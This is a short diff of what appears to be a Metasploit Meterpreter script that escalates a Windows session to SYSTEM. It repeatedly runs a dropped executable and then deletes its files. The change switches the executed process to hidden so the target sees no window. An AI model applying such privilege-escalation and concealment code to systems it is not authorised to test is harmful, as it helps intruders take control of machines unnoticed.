@@ -59,7 +59,7 @@ if client.platform =~ /win32/
         tempdrive = tempdir.split(':')[0]
 
         while not client.sys.config.getuid.casecmp("NT AUTHORITY\\SYSTEM") == 0
-            session.sys.process.execute("cmd.exe /c #{tempexe} #{server.pid}", nil, {'Hidden' => false, 'Channelized' => false})
+            session.sys.process.execute("cmd.exe /c #{tempexe} #{server.pid}", nil, {'Hidden' => true, 'Channelized' => false})
         end
 
         print_status("Deleting files...")
